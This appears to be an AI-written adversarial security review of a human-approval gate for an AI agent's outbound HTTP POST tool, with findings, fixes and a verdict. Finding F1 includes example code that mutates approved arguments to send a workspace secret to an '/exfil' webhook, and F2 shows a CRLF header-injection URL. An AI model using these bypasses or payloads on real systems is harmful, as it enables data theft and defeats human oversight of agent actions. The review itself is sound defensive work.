# net.post Tier-2 code panel: x-ai/grok-4.5

_finish=stop seconds=188.8 cost=$0.1378 usage={'prompt_tokens': 39885, 'completion_tokens': 9702, 'total_tokens': 49587, 'cost': 0.1377644, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 128, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.1377644, 'upstream_inference_prompt_cost': 0.0795524, 'upstream_inference_completions_cost': 0.058212}, 'completion_tokens_details': {'reasoning_tokens': 7474, 'image_tokens': 0, 'audio_tokens': 0}}_

# Adversarial review: ADR 0003 Tier-2 `net.post`

## Findings

### F1 / HELD ARGS NOT FROZEN — APPROVED URL/BODY CAN DIVERGE AT SEND
| | |
|---|---|
| **Severity** | **HIGH** |
| **Location** | `governance.py` (HELD `Decision` construction ~lines with `args=intent.args`, `preview={..., "args": intent.args}`); `loop.py:approve` → `reauthorized_or_denied` + `execute_and_verify` (uses `decision.args` as-is); `reauthorized_or_denied` egress branch (re-derives cap from *current* `args["url"]` only) |

**Concrete bypass**
```python
held = govern_action(session, ToolIntent("net_post", {
    "url": "https://api.example/v1/safe",
    "body": '{"action":"harmless"}',
}, "structured"))
# human sees preview for api.example / harmless
assert held.status == HELD

# any holder of the Decision reference (proposal pool, UI layer, buggy host code)
held.args["url"] = "https://webhook.allowed/exfil"   # also granted net.post:*
held.args["body"] = secret_from_workspace
out = approve(session, held)   # re-gate checks net.post:webhook.allowed — PASSES
# credential looked up for webhook.allowed; body sent is the mutated one
```

**Why it breaks a guarantee**  
ADR/comments claim re-gate uses the **frozen** destination and that “body approved == body sent.” Args are a live mutable `dict` shared with `preview` (no `tuple`/`MappingProxyType`/deep-copy/hash bind). Re-gate only checks *current* `net.post:<canonical(url)>` against *current* caps — not that url/body still equal what was held. This is exactly **what-was-approved vs what-is-sent**, and credential injection follows the *mutated* host (`execute_and_verify` cred lookup).

**Independent check?** No. Transport does not know what the human saw. Capability re-check does not bind body and only validates the post-mutation URL.

**Fix**  
At HELD time: deep-freeze args (`tuple` of items or immutable copy), store `url_canon`, `body_sha256`, `body_len`. At `approve`/`reauthorized_or_denied`: refuse if `args` identity/hash diverges; re-derive cap from frozen url only; pass frozen args into `execute_and_verify`.

---

### F2 / REQUEST-TARGET CONTROL CHARS NOT REJECTED (CRLF / `InvalidURL` RAISE)
| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Location** | `egress.py:post` — `target = parts.path...` then `conn.putrequest("POST", target, ...)` (no cleanliness check); same pattern in `fetch` (Tier-1 legacy) |

**Concrete input**
```python
egress.post(
  "https://api.example/x\r\nX-Injected: 1",
  body='{"a":1}',
  auth="Bearer sk-secret",
  ...
)
```
- **CPython with `http.client` path validation** (3.8.3+): `InvalidURL` is raised. It is **not** a subclass of `HTTPException`, so it is **not** caught by `except (ssl.SSLError, OSError, http.client.HTTPException)`. `post()` violates “Never raises”; `execute_and_verify`’s `egress_log` path has **no** try/except → `govern_action` / `approve` can raise (also violates their fail-closed-record contract).
- **Older http.client without validation**: request-line/header injection on a connection that already carries **host-injected `Authorization`** and body.

**Why it breaks a guarantee**  
Header/target injection is explicitly in-scope for `content_type`/`auth` (`_is_clean_header_value`) but **not** applied to the request target. Emission path is worse than GET because body + credential are on the wire. Raise path breaks “refusal is a non-ok `EgressRecord`.”

**Independent check?** Capability gate only needs a valid *host*; path CRLF does not fail `canonical_host`. No second check on target bytes.

**Fix**  
Reject target (path+query) unless it passes the same control-char policy (and optionally a strict allowed set). Catch `http.client.InvalidURL` (and broad `Exception` at the transport boundary) → `_refused(...)`.

---

### F3 / NON–LATIN-1 `content_type` / `auth` CAN RAISE OUT OF `post()`
| | |
|---|---|
| **Severity** | **LOW** |
| **Location** | `egress.py:post` — `_is_clean_header_value` allows `ord≥0x20` non-ASCII; `conn.putheader(...)` encodes Latin-1; except-list omits `UnicodeEncodeError` |

**Concrete input**
```python
egress.post("https://api.example/x", "{}", content_type="application/json; x=☃")
# or host cred: egress_credentials = {"api.example": "Bearer …☃…"}
```
`putheader` → `UnicodeEncodeError` → propagates through `_exec_net_post` / `execute_and_verify`.

**Why it matters**  
Same “never raises / always `EgressRecord`” contract. Uncaught exception after partial write is unlikely here (headers before `send`), but audit/decision path can abort without a structured refuse.

**Independent check?** No.

**Fix**  
Require ASCII (or Latin-1-encodable) header values in `_is_clean_header_value`; catch `UnicodeEncodeError` → refused record.

---

### F4 / PREVIEW BOUNDARY IS BYTE-SLICE THEN UTF-8 REPLACE (NIT)
| | |
|---|---|
| **Severity** | **LOW** |
| **Location** | `egress.py:post` — `body_bytes[:_BODY_PREVIEW_BYTES].decode("utf-8", "replace")` |

**Concrete input**  
Body whose 512th byte is mid–UTF-8 sequence; `keep_preview=True`.

**Why**  
Does not exceed the 512-*byte* source cap or leak when `keep_preview=False`. Can insert U+FFFD and make `len(preview)` ≠ 512 characters; forensic “exact bytes approved” is slightly muddy at the edge. Not an exfil bypass.

**Independent check?** N/A.

**Fix**  
Decode then truncate characters, or store `preview_hex` / base64 of the raw 512 bytes.

---

## Non-findings (attack worked; another layer or code holds)

| Attack | Result |
|---|---|
| **Redirect re-POST / second connection** | Fail-closed on 3xx; single conn; body+auth not replayed to `Location` (`post` + tests). |
| **Model sets `Authorization` via args** | `_exec_net_post` / `execute_tool` never read `args["auth"]`; only seam `egress_auth`. Pinned by tests. |
| **Cred in `EgressRecord` / repr** | Not stored; tests assert absence. |
| **CRLF in `content_type` / `auth`** | `_is_clean_header_value` refuses. |
| **`net.get:H` → `net.post:H`** | Method-aware `required_capability` + `egress_method="POST"`; separate prefixes; tests. |
| **Auto-lift host A → emit B** | `net.post.auto:` + **exact** `canonical_host`; different host stays HELD. |
| **Proposer + auto → act_then_report** | `source=="proposed"` blocks auto-lift; floor to `propose_first`. (Depends on propose/parse always stamping `"proposed"` — not re-litigated; no forge path in shipped snippets.) |
| **Leash/importance/risk drop emission floor** | Non-auto mutating egress forced through `apply_cap(..., PROPOSE_FIRST)`; `NOTIFY_ONLY` still does not execute. |
| **Cred for host that failed gate** | Cred lookup only on `execute_and_verify` after gate/re-gate; key = same `canonical_host(url)`. |
| **Body type/cap evasion** | Non-str/bytes refused; len after UTF-8 encode; `MAX_POST_BODY`; no stream API. |
| **Canonical ≠ connect** | Same `canonical_host`; pin IP; SNI/cert on canonical name; userinfo/port/IDN/trailing-dot handled. |
| **`_exec_net_post` auth smuggle** | Clean. `verify_mode="egress_log"` is the correct non-artifact path. |

---

## STEELMAN

The emission design matches the ADR where it counts: separate `net.post` / `net.post.auto` namespaces, default human floor, no redirect follow, resolve-once IP pin, host-injected credentials never from model args or audit fields, and capability re-check at approve for **revoked** hosts. Transport reuse from Tier-1 is disciplined; tests actually pin the cross-namespace and auto-lift cases attackers care about.

## VERDICT

**MINOR_ISSUES** — No shipped path lets you complete a POST to a host that never had `net.post:<host>` (or turn `net.get` into emit); residual gaps are **held-args integrity** (stated “frozen” TOCTOU is only half-implemented) and **request-target / exception** hardening on the wire.

**Single highest-value fix:** Freeze HELD emission args (canonical url + body digest/bytes) at hold time and bind `approve`/`reauthorized_or_denied`/`execute_and_verify` to that snapshot so human-approved url/body/credential host cannot diverge at send.
